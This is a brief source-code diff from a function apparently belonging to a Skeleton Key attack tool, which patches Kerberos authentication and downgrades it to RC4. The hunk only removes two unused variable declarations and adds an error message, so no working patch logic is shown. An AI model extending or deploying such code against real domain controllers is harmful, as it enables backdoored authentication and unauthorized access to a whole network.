@@ -114,8 +114,6 @@ BOOL Skel_InstallOnKerbAuth(DWORD processID)
 	PCDLOCATECSYSTEM CDLocateCSystem = 0;
 	PKERB_ECRYPT pCrypt_aes128 = 0, pCrypt_aes256 = 0, pCrypt = 0;
 	SK_MODULE_INFORMATION pCryptInfo = { 0 };
-	PLSA_UNICODE_STRING lsaPatternRemoteStruct = 0;
-	LSA_UNICODE_STRING lsaPatternLocalStruct = { 0 };
 	HANDLE hProcess = 0;
 	HMODULE LocalCryptdllBase = 0;
 	LPVOID pattern_data = 0, pattern_struct = 0;
@@ -196,6 +194,9 @@ BOOL Skel_InstallOnKerbAuth(DWORD processID)
 				else
 					PRINT_ERROR(L"CDLocateCSystem error.\n");
 			}
+			else
+				PRINT_ERROR(L"RC4 downgrading error.\n");
+			
 			CloseHandle(hProcess);
 		}
 		else
